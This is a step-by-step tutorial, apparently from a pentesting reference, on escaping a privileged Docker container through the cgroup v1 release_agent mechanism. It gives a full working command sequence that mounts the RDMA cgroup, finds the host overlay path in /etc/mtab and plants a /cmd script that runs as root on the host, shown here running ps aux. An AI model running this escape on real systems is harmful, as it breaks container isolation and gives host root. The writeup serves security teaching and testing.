# Docker release\_agent cgroups escape

### Breaking down the proof of concept

To trigger this exploit we need a cgroup where we can create a `release_agent` file and trigger `release_agent` invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.

To do that, we create a `/tmp/cgrp` directory, mount the [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup controller and create a child cgroup (named “x” for the purposes of this example). While every cgroup controller has not been tested, this technique should work with the majority of cgroup controllers.

If you’re following along and get **`mount: /tmp/cgrp: special device cgroup does not exist`**, it’s because your setup doesn’t have the RDMA cgroup controller. **Change `rdma` to `memory` to fix it**. We’re using RDMA because the original PoC was only designed to work with it.

Note that cgroup controllers are global resources that can be mounted multiple times with different permissions and the changes rendered in one mount will apply to another.

We can see the “x” child cgroup creation and its directory listing below.

```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```

Next, we **enable cgroup** notifications on release of the “x” cgroup by **writing a 1** to its `notify_on_release` file. We also set the RDMA cgroup release agent to execute a `/cmd` script — which we will later create in the container — by writing the `/cmd` script path on the host to the `release_agent` file. To do it, we’ll grab the container’s path on the host from the `/etc/mtab` file.

The files we add or modify in the container are present on the host, and it is possible to modify them from both worlds: the path in the container and their path on the host.

Those operations can be seen below:

```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Note the path to the `/cmd` script, which we are going to create on the host:

```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```

Now, we create the `/cmd` script such that it will execute the `ps aux` command and save its output into `/output` on the container by specifying the full path of the output file on the host. At the end, we also print the `/cmd` script to see its contents:

```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```

Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a `/bin/sh` process and writing its PID to the `cgroup.procs` file in “x” child cgroup directory, the script on the host will execute after `/bin/sh` exits. The output of `ps aux` performed on the host is then saved to the `/output` file inside the container:

```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```

### References

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
